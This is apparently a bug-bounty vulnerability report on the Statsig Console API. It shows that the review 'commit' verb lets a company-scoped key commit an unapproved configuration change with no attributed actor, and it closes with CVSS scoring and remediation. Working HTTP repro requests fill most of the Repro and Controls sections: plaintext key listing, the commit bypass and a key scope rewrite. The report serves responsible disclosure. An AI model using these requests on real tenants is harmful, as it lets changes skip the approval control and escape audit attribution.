# Statsig Console — the review/approval control is bypassable: `commit` is the one verb in the review family that does not resolve an acting user, so a company-scoped key commits an **unapproved** review and the change goes live

**Severity:** CVSS 6.5 (Medium) — `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` (computed, see Impact)
**Tenant:** our own project `4n6HCY59mDqwX1iSZQtNvx` only; no third-party data. Accounts: `mohamed-9499-2@agentmail.to` (Owner, user id `nZ2wI4FMJek95vjJHdnWR`), `mohamed-9499-3@agentmail.to` (Member, user id `13B13WHITpDKkMpbi22BGW`). Credentials used: `K_class` `console-9q…df7i` (id `6PqmVNbso37K9JfaSqwcx7`, `owner: null`, `["omni_read_write"]`); `K_oclass` `console-kp…zVTQ` (id `6R4wLDuLzHsUYLWLrSMZmv`, `owner: null`); `K_mp` `console-Jd…NK9Z` (id `6VgLPTFcVbPpo166GQ10zf`, owner the Member, `["personal_read_write"]`); `K_op` `console-tx…DRwU` (id `6T1EzSfNYvDTlZD2gvebaJ`, owner the Owner).

## Summary

Statsig's configuration-review workflow is guarded by a check every mutating verb in the review family is supposed to make: **resolve the acting user behind the credential.** Four of the five verbs do it. `commit` does not. Held against the same tenant, the same gate, the same review and the same credential class, the verb is the only variable:

```
company-scoped CONSOLE key (owner: null, ["omni_read_write"])

POST   /console/v1/gates/{id}/reviews                 -> 400  "This review-mutating CAPI call has no acting user.
PUT    /console/v1/gates/{id}/reviews/{rid}/approve   -> 400   Use a key owned by a user, or set the
PUT    /console/v1/gates/{id}/reviews/{rid}/reject    -> 400   x-on-behalf-of header."
DELETE /console/v1/gates/{id}/reviews/{rid}           -> 400   (all four, error key: on_behalf_of_required)

PUT    /console/v1/gates/{id}/reviews/{rid}/commit    -> 200  "Gate review committed successfully"
                                                              ...on a review that was NEVER approved.
```

The result is a production change that lands with **no approval, no reviewer and no attributable actor**:

```
gate  rb_probe_gate:   isEnabled  true -> false     version 3 -> 4     lastModifierEmail: null
review R1:             status  pending -> committed                    reviewers: []
audit:  config_review_commit   updatedBy "CONSOLE API - console-9q…"   modifierEmail: null
```

The checks that would have stopped it **exist and work on the Member's own personal key** — `403 self_approval_blocked` on `approve`, and `403 missing_commit_permission` on `commit`, the vendor stating in its own words that an unapproved commit is a permission-gated action (`skip_config_review`). On the class-key path the acting user is never resolved, so that check is evaluated **against the key's own scope list instead of a user's** (this bounds the finding: a read-only class key is correctly refused — see Controls).

**Not a duplicate of `SUBMISSION-STATSIG-MEMBER-TO-ADMIN.md`:** that report is about what the Member can **write** (configs and role assignment) via `/console/v1/users`, `/console/v1/settings/roles`, `/console/v1/roles`; this one is about the **control that is supposed to gate those writes** — the review/approval workflow. The `commit` verb, `/reviews`, `skip_config_review` and `on_behalf_of_required` appear nowhere in that document (verified by reading it end to end). The two share the root pattern (the Console API authorizes on the key, not the caller) and one precondition — a Member can read a company-scoped key in plaintext and rewrite its scopes through the ungated `UpdateSDKKeyScopes`; if the program treats that as one root cause, fold this in as an **additional impact of the filed report** rather than closing it as a duplicate, because the review workflow does not catch the config writes demonstrated there and that fact is stated nowhere else.

## Repro

All requests raw HTTP, run in this order in the independent run. Secrets masked `first10…last4`.

**1. The Member reads the company-scoped class key in plaintext** (the already-filed prerequisite; the Member's own session is enough, no elevation needed):

```
POST /api/graphql?company_id=4n6HCY59mDqwX1iSZQtNvx HTTP/1.1
Host: console.statsig.com
Cookie: <MEMBER SESSION>
x-csrf-token: 1
Content-Type: application/json

{"id":"0799d4b79f772f8f357d36dfc49f9a7a","operationName":null,"variables":{}}
```
```
HTTP/1.1 200 OK
{"data":{"viewer_company":{"console_api_keys":[
  {"id":"6PqmVNbso37K9JfaSqwcx7","description":"rb-class-omni","type":null,
   "scopes":["omni_read_write"],"owner":null,"value":"console-9q…df7i"},
  {"id":"6R4wLDuLzHsUYLWLrSMZmv","description":"rb-ownerclass-omni","type":null,
   "scopes":["omni_read_write"],"owner":null,"value":"console-kp…zVTQ"},
  {"id":"6T1EzSfNYvDTlZD2gvebaJ","description":"rb-owner-personal",…,"owner":{"id":"nZ2wI4FMJek95vjJHdnWR"},…},
  {"id":"6VgLPTFcVbPpo166GQ10zf","description":"rb-member-personal",…,"owner":{"id":"13B13WHITpDKkMpbi22BGW"},…}
]}}}
```

The Member session sees **every** key in the project, including both `owner: null` company-scoped keys, in plaintext.

**2. The Member creates a review on a real gate** (the Member creates gate `rb_probe_gate` first, `201 "Gate created successfully."`, baseline `isEnabled: true`, `version 3`):

```
POST /console/v1/gates/rb_probe_gate/reviews HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: *** K_mp>
Content-Type: application/json

{"change":{"is_enabled":false}}
```
```
HTTP/1.1 201 Created
{"message":"Review created successfully.","data":{
  "review_id":"m2gpRfjAA9UB6JG9SS0iR","status":"pending","type":"toggle_enabled",
  "author":{"id":"13B13WHITpDKkMpbi22BGW","email":"mohamed-9499-3@agentmail.to"},
  "reviewers":[],"description":"rb independent: unapproved-commit demo",
  "content":{"type":"toggle_enabled",
             "current":{"is_enabled":true,"default_value":false},
             "proposed":{"is_enabled":false,"default_value":false}}},
 "links":{"ui":"…?review_id=m2gpRfjAA9UB6JG9SS0iR",
          "commit":"/console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/commit"}}
```

`R1 = m2gpRfjAA9UB6JG9SS0iR`, status `pending`, `reviewers: []`. The server itself hands the caller the `commit` link.

**3. The contrast — the four sibling verbs refuse the class key:**

```
POST /console/v1/gates/rb_probe_gate/reviews   STATSIG-API-KEY: *** K_class>   {"change":{"is_enabled":false}}
-> 400 {"message":"This review-mutating CAPI call has no acting user. Use a key owned by a user, or set the x-on-behalf-of header.","status":400,"key":"on_behalf_of_required"}

PUT /console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/approve   STATSIG-API-KEY: *** K_class>
-> 400 {"message":"This review-mutating CAPI call has no acting user. …","status":400,"key":"on_behalf_of_required"}

PUT /console/v1/gates/rb_probe_gate/reviews/GPltMKsy5eV2j0Woftvof/reject    STATSIG-API-KEY: *** K_class>
-> 400 {"message":"This review-mutating CAPI call has no acting user. …","status":400,"key":"on_behalf_of_required"}

DELETE /console/v1/gates/rb_probe_gate/reviews/GPltMKsy5eV2j0Woftvof       STATSIG-API-KEY: *** K_class>
-> 400 {"message":"This review-mutating CAPI call has no acting user. …","status":400,"key":"on_behalf_of_required"}
```

Four verbs, four refusals, one named error key — the guard is implemented, deliberate, and the *same guard* in all four places.

**4. The checks that would have stopped it are live, on the Member's own key** (same review R1, same absence of approval; only the credential class differs from step 3):

```
PUT /console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/approve   STATSIG-API-KEY: *** K_mp>
-> 403 {"message":"The review author cannot approve their own review. To self-approve a change (when the config permits self-approval), commit the review directly instead of approving it.","status":403,"key":"self_approval_blocked"}

PUT /console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/commit    STATSIG-API-KEY: *** K_mp>
-> 403 {"message":"Committing a review that has not been separately approved requires the \"skip_config_review\" permission.","status":403,"key":"missing_commit_permission"}
```

Read-back after both attempts — **nothing moved**:

```
GET /console/v1/gates/rb_probe_gate
-> 200 {"isEnabled": true, "version": 3,
        "lastModifierID":"13B13WHITpDKkMpbi22BGW",
        "lastModifierEmail":"mohamed-9499-3@agentmail.to", "status":"In Progress"}
```

**5. The finding — the class key commits R1, which was never approved:**

```
PUT /console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/commit HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: *** K_class>
```
```
HTTP/1.1 200 OK
{"message":"Gate review committed successfully"}
```

No body. No `x-on-behalf-of`. No approval event was ever recorded for R1 (`reviewers: []` on create; the `approve` verb was refused for both credentials in steps 3 and 4).

**6. Read-back through an independent route:**

```
GET /console/v1/gates/rb_probe_gate   STATSIG-API-KEY: *** K_class>
-> 200 {"data":{"id":"rb_probe_gate","isEnabled": false, "version": 4, "status":"Disabled",
         "lastModifierID":"6PqmVNbso37K9JfaSqwcx7",
         "lastModifierEmail": null,
         "lastModifierName":"CONSOLE API - console-9q…",
         "owner":{"ownerID":"13B13WHITpDKkMpbi22BGW","ownerEmail":"mohamed-9499-3@agentmail.to"}}}

GET /console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR
-> 200 {"review_id":"m2gpRfjAA9UB6JG9SS0iR","status": "committed",
        "author":{"id":"13B13WHITpDKkMpbi22BGW","email":"mohamed-9499-3@agentmail.to"},
        "reviewers": []}

GET /console/v1/gates/rb_probe_gate/reviews
-> 200 {"data":[{"review_id":"m2gpRfjAA9UB6JG9SS0iR","status":"committed", …}],"pagination":{"totalItems":1}}

GET /console/v1/gates/rb_probe_gate   (the same read-back through a DIFFERENT key class)
-> 200 isEnabled: false, version: 4, lastModifierEmail: null
```

`isEnabled true → false`, `version 3 → 4`, review `pending → committed`, `reviewers: []`. The change is live and the approval step never happened.

**7. The audit trail — the attribution failure:**

```
GET /console/v1/audit_logs   STATSIG-API-KEY: *** K_class>
-> 200
[
 {"actionType":"config_review_commit","name":"rb_probe_gate","changeLog":"Committed Config Review",
  "time":"14:10:44 GMT+0000 (Coordinated Universal Time)",
  "updatedBy":"CONSOLE API - console-9q…","updatedByUserID":"6PqmVNbso37K9JfaSqwcx7",
  "modifierEmail": null, "changes":{}},

 {"actionType":"config_state_toggle","name":"rb_probe_gate",
  "changeLog":"Updated config from In Progress to Disabled.",
  "updatedBy":"CONSOLE API - console-9q…","updatedByUserID":"6PqmVNbso37K9JfaSqwcx7",
  "modifierEmail": null, "changes":{"enabled":{"new":false,"old":true}}},

 {"actionType":"config_review_create","name":"rb_probe_gate","changeLog":"Created Config Review",
  "time":"14:10:34 GMT+0000 (Coordinated Universal Time)",
  "updatedBy":"Bruno Hunter via CONSOLE API","updatedByUserID":"13B13WHITpDKkMpbi22BGW",
  "modifierEmail":"mohamed-9499-3@agentmail.to","changes":{}},

 {"actionType":"gate_create","name":"rb_probe_gate","changeLog":"Created Gate", …}
]
```

The review was created at **14:10:34** attributed to a person; committed at **14:10:44** attributed to a credential. The commit and the resulting state change land in the **same second**, with no approval event between them.

**8. The same verb, second family (`dynamic_configs`) — the missing guard is on the `commit` route as a family:**

```
POST /console/v1/dynamic_configs/rb_probe_dc/reviews   STATSIG-API-KEY: *** K_mp>   {"change":{"is_enabled":false}}
-> 201 review_id 1V17s0z9ffdDmeVgAeLZ1x, status pending, reviewers []

PUT /console/v1/dynamic_configs/rb_probe_dc/reviews/1V17s0z9ffdDmeVgAeLZ1x/reject
   STATSIG-API-KEY: *** K_class>          -> 400 on_behalf_of_required     <- sibling guarded

PUT /console/v1/dynamic_configs/rb_probe_dc/reviews/1V17s0z9ffdDmeVgAeLZ1x/commit
   STATSIG-API-KEY: *** K_class>          -> 200 "Dynamic config review committed successfully"
                                          <- THE BYPASS, second family

GET /console/v1/dynamic_configs/rb_probe_dc   -> isEnabled: false, version 2, lastModifierEmail: null
GET …/reviews/1V17s0z9ffdDmeVgAeLZ1x          -> status: "committed"
```

**Controls**

* **Fabricated-id control (the decisive one)** — the commit route validates its object, so the `200` in step 5 is a real commit of a real review, not a blind endpoint that 200s anything: `PUT …/gates/rb_probe_gate/reviews/zzfm-nope-0000000000/commit -> 404 {"message":"Review not found","status":404}` with **both** the class key and the personal key; `PUT …/gates/rb_nope_gate/reviews/zzfm-nope-0000000000/commit -> 404 {"message":"Gate not found","status":404}`; `GET …/gates/rb_probe_gate/reviews/zzfm-nope-0000000000 -> 404 "Review not found"`.
* **Author-independence (proven, not inferred):** the Owner authors R3 (`201 pending`, author `mohamed-9499-2@agentmail.to`) and the class key commits it -> `200 "Gate review committed successfully"`, `GET R3 -> status "committed", reviewers: []`, author still the Owner; gate read-back `isEnabled true, version 5, lastModifierEmail: null`. **The class key commits someone else's review.**
* **Second key, second family:** the Owner's own company-scoped key `K_oclass` commits a review authored by the Owner -> `200`, gate `version 5 -> 6`, `lastModifierEmail: null`. Not specific to one key — any `owner: null` console key bypasses the guard.
* **Read-only class key is correctly refused** (this bounds the finding): `K_ro (owner:null, ["omni_read_only"]) commit -> 403 missing_commit_permission` on the **same** review that `K_class (owner:null, ["omni_read_write"]) commit -> 200` commits. A triager reproducing with a read-only key will see the `403`; `skip_config_review` **is** evaluated on `commit`, but satisfied by the credential's scope list rather than a resolved user's role.
* **The guard is misplaced, not absent — proven by its own sibling:** `DELETE …/segments/{id}/reviews/{fabricated-id}` with the class key -> `400 on_behalf_of_required` (guard fires **before** lookup); `PUT …/segments/{id}/reviews/{fabricated-id}/commit` -> `404 "Review not found"` (no guard, lookup first). Same verb pair, same object, one with the middleware and one without.
* **Policy state is not the variable:** the Member's personal key was refused with `403 missing_commit_permission` on **the same review, in the same policy state** (`is_config_review_required: false`, gate `reviewSettings {requiredReview: false, allowedReviewers: []}`), with the same absence of approval. If the policy state allowed the commit, the personal-key call would have returned `200` too. The difference between `403` and `200` on identical requests is the credential class, i.e. whether an acting user was resolved.
* **The legitimate path, for contrast** — the system knows how to attribute an action: create (Member, `K_mp`) -> `201 pending`; approve (Owner, `K_op`) -> `200 "Dynamic config review approved successfully."`, status `"accepted"`; commit (Owner, `K_op`) -> `200 "Dynamic config review committed successfully"`. Audit rows `config_review_create` / `config_review_accept` / `config_review_commit` each carry a `modifierEmail`, and the read-back shows `lastModifierEmail "mohamed-9499-2@agentmail.to"` — a real person at every step. The bypass path carries `null`. **That is the proof the system is capable of attribution and the bypass simply never resolves an actor.**
* **Isolation experiment settling the obvious objection** ("a company-scoped key is created by an Admin, so the Admin granted the permissions"): Admin mints the key `owner:null, ["omni_read_only"]` -> `200`; ARM 1 that credential on commit -> `403 missing_commit_permission`, gate unchanged (v3); the Member calls `UpdateSDKKeyScopes` -> `200`, v2 -> v3, **key value unchanged**, read back `["omni_read_write"]`; ARM 2 the **same review, same key value** -> `200 "Gate review committed successfully"`, `isEnabled true -> false`, v3 -> v4, `lastModifierEmail: null`, `reviewers: []`. Audit: `sdk_key_create` by the Admin, `sdk_key_update_scopes` by the **Member**, `config_review_commit` by the key with `modifierEmail: null`. **The Admin created the object; the Admin did not grant the permission that was used.**
* **The same bypass reaches two more families, proven end to end:** `experiments` — class key on create/approve/reject/edit/cancel all `400 on_behalf_of_required`; Member's own key on approve `403 self_approval_blocked`; Member's own key on commit `403 missing_commit_permission`; class key on commit of a pending, never-approved review `200`, `status setup -> archived`, `lastModifierID` = the key id, `lastModifierEmail: null`, `reviewers: []`. `autotunes` — class key on commit of an unapproved review `200`, `isStarted false -> true`, `modifierEmail: null`. **The autotunes refusal is the strongest single piece of evidence:** on the Member's own key the vendor refuses with a **role** check (*"your role is not permitted to skip the pre-commit webhook workflow"*), which can only execute against a **resolved principal**; the same request with the class key succeeds.
* **Route inventory:** exactly **five** `/commit` routes exist across **208** documented `/console/v1/*` paths, all the same shape `PUT …/{family}/{id}/reviews/{reviewID}/commit` for `gates`, `dynamic_configs`, `experiments`, `autotunes`, `segments`. A docs grep and an independent inventory of the shipped Console operation set agree.

## Impact

* **Integrity — a change goes live with no approval and no reviewer.** A `pending` review authored by a Member is committed by a credential with no owning user. The gate flipped `isEnabled true → false` (`version 3 → 4`); the dynamic config did the same (`version 2`). Both re-read through an independent key class to confirm the state persisted.
* **The control that is supposed to gate the already-filed Member→Admin finding is itself bypassable.** An organisation that turned review on as its mitigation for the filed finding is not protected by it.
* **Audit-trail integrity — the action is unattributable.** The commit records `updatedBy "CONSOLE API - console-9q…"` with `modifierEmail: null`. The review's own `author` field still names the Member, so an investigator reading the review object sees a person while one reading the audit trail sees a credential.
* **Detection:** nothing in the response distinguishes this commit from a legitimate one — both are `200 {"message":"Gate review committed successfully"}`. The only signal is `modifierEmail: null` on the audit row, which is exactly the field a reviewer would not think to look at because every other row around it is populated.
* **Business terms:** an unapproved production configuration change (a gate disabled / a dynamic config flipped) lands in the audit trail with no human attached, and the approval control an administrator relies on is shown to be satisfiable without any human approving anything.

**Ceiling.** This is **6.5 (Medium)** and deliberately not scored higher:

| Term | Support |
|---|---|
| `AV:N` | The Console API is reachable over the internet. |
| `AC:L` | One request; no race, no timing, no special condition. |
| `PR:L` | Requires a **Member** account in the project (low privilege). |
| `UI:N` | No victim interaction; the attacker is the caller. |
| `S:U` | Impact stays within the project's own configuration plane. |
| `C:N` | **Nothing is disclosed** — the bypass writes configuration and exposes nothing the caller could not already read. |
| `I:H` | Measured: an unapproved production configuration change is committed (`isEnabled true → false`, `version 3 → 4`, review `pending → committed`). |
| `A:N` | No availability term is claimed. |

What the attacker does **not** get: no confidentiality term; no cross-tenant reach (every call is inside our own project `4n6HCY59mDqwX1iSZQtNvx`); no scope change (`S:U`). It requires a Member **plus** an existing company-scoped `CONSOLE` key — a plain Member can read one in plaintext and rewrite its scopes but **cannot create one** (`"Must be admin of project"`; `POST /console/v1/keys -> 403 "Insufficient permissions."`), and a project does not get one by default; the key's existing scope is irrelevant (`["omni_read_only"]` suffices). That prerequisite is why the base carries `PR:L` rather than `PR:N`. **A read-only class key cannot exploit it** (`403 missing_commit_permission`). **Only `gates` and `dynamic_configs` were demonstrated** end to end: `experiments` and `autotunes` have no objects on this tenant (`POST /console/v1/experiments -> 400 "Bad Request Exception"` on two body shapes; both collections empty — a fabricated id reached object lookup and returned `404 "Experiment not found"` / `404 "Autotune experiment not found"`), and `segments` has no create-review route. `x-on-behalf-of` was tested on `create` only (three value shapes, all `400 on_behalf_of_required`); in this run `commit` was called with no such header. The bypass was not re-demonstrated with the review policy ON. The commit cannot be undone through the API by the caller: `DELETE` on the committed review returns `400 on_behalf_of_required` for the class key — the same guard that should have blocked the commit.

**Scoring note, stated rather than buried:** if a triager holds that the review policy being off on this tenant makes the integrity consequence moot, the score drops to `I:L` = **3.5 (Low)**. That reading is not supported by the Controls above (the identical call with the personal key is refused in the same policy state), but the term is the only one in dispute. The 6.5 is a computed result, not an assertion: the same calculator run on `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` reproduces the filed report's published **8.8** exactly.

## Remediation

The fix is server-side, in the `commit` handler, and it is small — the reference implementation is already shipped on the four sibling verbs.

1. **Resolve the acting user on `commit`, exactly as `create` / `approve` / `reject` / `cancel` already do.** Refuse a key whose `owner` is `null` unless a valid `x-on-behalf-of` is supplied, returning `400 {"key":"on_behalf_of_required"}` with the existing message. This is a one-line addition to the shared review-mutation middleware, not a new mechanism.
2. **Evaluate the approval precondition on the resolved identity.** Once an acting user exists, apply the check the personal-key path already enforces — an unapproved commit requires `skip_config_review` on that user — and return the existing `403 {"key":"missing_commit_permission"}`. Also apply the `self_approval_blocked` / `allow_self_approval` decision to `commit`, since `commit` is the documented self-approval route.
3. **Make the middleware shared, not per-verb.** The defect is that one handler in a family of five omits the guard. Wire acting-user resolution into the review-route group so a future verb cannot be added without it.
4. **Attribute the audit row.** A commit through a `owner: null` key should still record the resolved `modifierEmail` (or, if no user can be resolved, be refused per (1)). `modifierEmail: null` on a `config_review_commit` row should be treated as a bug signal in its own right — it is the fingerprint of this class of defect.
5. **Regression test:** with review required and a `pending` review authored by user B, assert that (a) an `owner: null` key on `commit` returns `400 on_behalf_of_required`, (b) B's own key returns `403 missing_commit_permission`, (c) an approver's key returns `200`, and (d) the gate's `lastModifierEmail` is never `null` on any of the four outcomes. Additionally, a route-table test asserting `on_behalf_of_required` for **every** review-mutating route with an `owner: null` key.

**Shared enabler:** the precondition for both this report and the filed Member→Admin report is the ungated `UpdateSDKKeyScopes` — a Member rewrites a company-scoped key's scope from `["omni_read_only"]` to `["omni_read_write"]` with a `200` and no admin gate. Fixing only the `commit` verb (or only the role write) leaves that enabler intact; the two must be fixed together or the scope mutation will simply be re-used against whatever check remains.

---
Evidence: escal/rb/v1_recon.json, escal/rb/v2_contrast.json, escal/rb/v3_gaps.json, escal/rb/v3b_legit_and_family3.json, escal/rb/v4_cleanup.json, escal/rb/v4b_final_state.json, escal/rb_calls.json, escal/rb_h.py, escal/rb_v1.py, escal/rb_v2.py, escal/rb_v3.py, escal/rb_v3b.py, escal/rb_v4.py, escal/rb_v4b.py, escal/rb_state.json, escal/restsw/p4_commit_bypass.json, escal/restsw/p5_bypass_clean.json, escal/REPORT-CONSOLE-REST-SWEEP.md, escal/SUBMISSION-STATSIG-MEMBER-TO-ADMIN.md
